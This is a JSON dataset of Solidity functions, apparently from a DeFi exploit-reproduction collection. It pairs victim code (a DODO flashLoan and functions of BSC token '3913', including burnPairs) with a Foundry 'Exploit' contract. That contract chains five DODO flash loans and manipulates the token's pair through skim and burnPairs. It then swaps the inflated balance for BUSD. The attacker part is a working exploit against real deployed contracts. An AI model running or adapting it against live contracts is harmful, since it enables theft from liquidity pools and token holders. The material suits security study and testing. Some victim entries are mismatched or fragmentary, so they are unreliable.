[
  {
    "contract/interface": "IDodo",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external preventReentrant {\n        _transferBaseOut(assetTo, baseAmount);\n        _transferQuoteOut(assetTo, quoteAmount);\n\n        if (data.length > 0)\n            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);\n\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n\n        // no input -> pure loss\n        require(\n            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,\n            \"FLASH_LOAN_FAILED\"\n        );\n\n        // sell quote case\n        // quote input + base output\n        if (baseBalance < _BASE_RESERVE_) {\n            uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));\n            (\n                uint256 receiveBaseAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newQuoteTarget\n            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve\n            require(uint256(_BASE_RESERVE_).sub(baseBalance) <= receiveBaseAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferBaseOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newQuoteTarget <= uint112(-1),\"OVERFLOW\");\n                _QUOTE_TARGET_ = uint112(newQuoteTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_QUOTE_TOKEN_),\n                address(_BASE_TOKEN_),\n                quoteInput,\n                receiveBaseAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        // sell base case\n        // base input + quote output\n        if (quoteBalance < _QUOTE_RESERVE_) {\n            uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));\n            (\n                uint256 receiveQuoteAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newBaseTarget\n            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve\n            require(uint256(_QUOTE_RESERVE_).sub(quoteBalance) <= receiveQuoteAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferQuoteOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newBaseTarget <= uint112(-1),\"OVERFLOW\");\n                _BASE_TARGET_ = uint112(newBaseTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_BASE_TOKEN_),\n                address(_QUOTE_TOKEN_),\n                baseInput,\n                receiveQuoteAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        _sync();\n        \n        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);\n    }\n\n    // ============ Query Functions ============\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "burnPairs",
    "original_code": "  function burnPairs() public {\n    address pair;\n    address to;\n    uint256 amount;\n    uint256 amountDividend;\n    address[] memory pairList = new address[](2);\n    pairList[0] = _v2Pair_usdt;\n    pairList[1] = _v2Pair_9419;\n    for (uint256 i = 0; i < pairList.length; i++) {\n      pair = pairList[i];\n      amount = burnAmountPair(pair);\n      if (amount > 0) {\n        to = pair == _v2Pair_usdt\n          ? address(_smartVault_usdt)\n          : address(_smartVault_9419);\n\n        _burnTime[pair] = block.timestamp;\n        _balances[pair] -= amount;\n\n        amountDividend = amount.mul(_burnAssignRateDividend).div(RBASE);\n        uint256 amount_pool = amount.mul(_burnAssignRatePool).div(RBASE);\n        uint256 amount_invite = amount.sub(amountDividend).sub(amount_pool);\n\n        // c2 pool\n        _balances[to] += amount_pool;\n        emit Transfer(pair, to, amount_pool);\n\n        // c1\n        _balances[address(_smartVault_dividend_1)] += amountDividend;\n        emit Transfer(pair, address(_smartVault_dividend_1), amountDividend);\n        // c2 invite\n        _balances[address(_smartVault_invite)] += amount_invite;\n        emit Transfer(pair, address(_smartVault_invite), amount_invite);\n\n        IUniswapV2Pair(pair).sync();\n        addLiquidity(pair);\n      }\n    }\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n}\n\n// File: contracts/lib/SafeMath.sol\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "I3913",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "NewContract",
    "source_type": "victim_contract",
    "function_name": "transferToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == dodo1) {\n            dodo2FlashLoanAmount = busd.balanceOf(dodo2);\n            IDodo(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));\n            busd.transfer(dodo1, dodo1FlashLoanAmount);\n        } else if (msg.sender == dodo2) {\n            dodo3FlashLoanAmount = busd.balanceOf(dodo3);\n            IDodo(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));\n            busd.transfer(dodo2, dodo2FlashLoanAmount);\n        } else if (msg.sender == dodo3) {\n            dodo4FlashLoanAmount = busd.balanceOf(dodo4);\n            IDodo(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));\n            busd.transfer(dodo3, dodo3FlashLoanAmount);\n        } else if (msg.sender == dodo4) {\n            dodo5FlashLoanAmount = busd.balanceOf(dodo5);\n            IDodo(dodo5).flashLoan(0, dodo5FlashLoanAmount, address(this), new bytes(1));\n            busd.transfer(dodo4, dodo4FlashLoanAmount);\n        } else if (msg.sender == dodo5) {\n            //end of flash loan\n            busd.approve(address(pair), type(uint256).max);\n            busd.approve(address(router), type(uint256).max);\n\n            address[] memory path = new address[](2);\n            path[0] = address(busd);\n            path[1] = address(vulnerable);\n            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);\n            path[1] = address(token9419);\n            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);\n            NewContract x = new NewContract();\n\n            vulnerable.transfer(address(x), 1 ether);\n\n            x.transferToken(address(vulnerable), address(this));\n            path[1] = address(vulnerable);\n            router.swapExactTokensForTokens(\n                358_631_959_260_537_946_706_184, 0, path, address(this), block.timestamp + 100\n            );\n            busd.transfer(address(pair), 1);\n            assertEq(vulnerable.balanceOf(address(this)), 650_501_978_825_924_088_488_444_996_953);\n            vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));\n            pair.skim(address(x));\n\n            uint8 i = 0;\n            while (i < 10) {\n                x.transferToken(address(vulnerable), address(this));\n                if (vulnerable.balanceOf(address(0x570C19331c1B155C21ccD6C2D8e264785cc6F015)) != 1e15) {\n                    busd.transfer(address(pair), 1);\n                    vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));\n                    pair.skim(address(x));\n                } else {\n                    vulnerable.burnPairs();\n                }\n                i++;\n            }\n            assertEq(vulnerable.balanceOf(address(this)), 873_285_322_509_556_749_289_919_955_755);\n            path[0] = address(vulnerable);\n            path[1] = address(busd);\n            uint256[] memory amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)) * 98 / 100, path);\n            assertEq(amountOut[0], 855_819_616_059_365_614_304_121_556_639);\n\n            busd.transfer(address(pair), 1);\n            vulnerable.transfer(address(pair), amountOut[0]);\n\n            assertEq(amountOut[1] * 99 / 100, 386_867_521_275_785_735_087_292);\n            (uint112 res0, uint112 res1,) = pair.getReserves();\n            assertEq(res0, 585_082_814_956_957_699_188_861);\n            assertEq(res1, 424_480_476_638_586_992_222_101_033_564);\n            assert(amountOut[1] * 99 / 100 < res0);\n            assertEq(pair.token0(), address(busd));\n            pair.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));\n            path[0] = address(vulnerable);\n            path[1] = address(token9419);\n            amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)), path);\n            token9419.transfer(address(pair3913to9419), 1);\n            vulnerable.transfer(address(pair3913to9419), vulnerable.balanceOf(address(this)));\n            (res0, res1,) = pair3913to9419.getReserves();\n            assert(res0 > amountOut[1] * 99 / 100);\n            assertEq(pair3913to9419.token0(), address(token9419));\n            assertEq(amountOut[1] * 99 / 100, 278_798_044_220_113_865_039_589_361_218);\n\n            pair3913to9419.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));\n            //\n            path[0] = address(token9419);\n            path[1] = address(busd);\n            token9419.approve(address(router), type(uint256).max);\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                token9419.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100\n            );\n            busd.transfer(dodo5, dodo5FlashLoanAmount);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 33_132_467);\n        cheats.label(address(vulnerable), \"3913\");\n        cheats.label(address(pair), \"pair\");\n        cheats.label(address(token9419), \"9419\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(busd), address(this), 0);\n        emit log_named_decimal_uint(\n            \"attacker balance busd before attack:\", busd.balanceOf(address(this)), busd.decimals()\n        );\n        dodo1FlashLoanAmount = busd.balanceOf(dodo1);\n        IDodo(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));\n        emit log_named_decimal_uint(\n            \"attacker balance busd after attack:\", busd.balanceOf(address(this)), busd.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]